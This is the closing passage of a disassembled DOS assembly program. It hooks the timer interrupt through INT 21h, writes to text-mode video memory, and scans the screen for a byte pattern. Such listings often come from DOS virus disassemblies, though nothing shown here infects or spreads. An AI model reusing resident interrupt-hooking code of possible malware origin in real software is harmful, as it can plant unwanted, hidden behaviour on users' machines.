;			       SUBROUTINE
;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹

sub_17		proc	near
;*		mov	dx,offset loc_47	;*
		db	0BAh,0B0h, 06h
		mov	ax,251Ch
		int	21h			; DOS Services  ah=function 25h
						;  set intrpt vector al to ds:dx
		mov	byte ptr ds:data_56e,90h
		nop
		mov	ax,0B800h
		mov	es,ax
		mov	di,data_55e
		mov	ax,720h
		mov	cx,0Bh
		repne	stosw			; Rep zf=0+cx >0 Store ax to es:[di]
		push	cs
		pop	es
		retn
sub_17		endp

		db	0, 0
data_48		db	0
data_49		dw	720h
data_50		db	0Fh
		db	 0Ah, 0Fh, 0Ah, 0Fh, 0Ah, 0Fh
		db	 0Ah, 0Fh, 0Ah, 0Fh, 0Ah, 0Fh
		db	 0Ah, 0Fh, 08h,0FEh, 0Eh
data_51		db	0EEh
		db	0Ch
data_52		db	90h
		db	0FBh, 50h, 51h, 52h, 53h, 55h
		db	 56h, 57h, 1Eh, 06h, 0Eh, 1Fh
		db	0EBh, 0Bh, 90h
loc_40:
		pop	es
		pop	ds
		pop	di
		pop	si
		pop	bp
		pop	bx
		pop	dx
		pop	cx
		pop	ax
		iret				; Interrupt return
		db	0B8h, 00h,0B8h, 8Eh,0C0h
		db	0BFh,0A0h, 0Fh
		db	0BEh, 9Ah, 06h,0B9h, 16h, 00h
		db	0F2h,0A4h, 80h, 3Eh,0AEh, 06h
		db	0EEh, 74h, 08h,0C6h, 06h,0AEh
		db	 06h,0EEh,0EBh, 06h, 90h
loc_42:
		mov	data_51,0F0h
loc_43:
		mov	ax,es:[di]
		mov	ah,0Eh
		mov	data_49,ax
		mov	data_48,0
		jmp	short loc_40
		db	0BFh, 00h, 00h
loc_44:
		mov	si,offset data_50
		push	di
		mov	cx,12h
		cld				; Clear direction
		repe	cmpsb			; Rep zf=1+cx >0 Cmp [si] to es:[di]
		pop	di
		jz	loc_45			; Jump if zero
		inc	di
		inc	di
		cmp	di,0FA0h
		jne	loc_44			; Jump if not equal
		mov	di,0
loc_45:
		cmp	di,0F9Eh
		jne	loc_ret_46		; Jump if not equal
		mov	data_52,0CFh

loc_ret_46:
		retn
data_53		db	43h
		db	 0Ch, 0Ah, 45h, 00h,0CBh, 87h
		db	0BFh, 1Dh, 25h, 1Eh, 57h, 9Ah
		db	 83h, 00h,0CBh, 87h,0E8h
		db	2Eh

seg_a		ends



		end	start
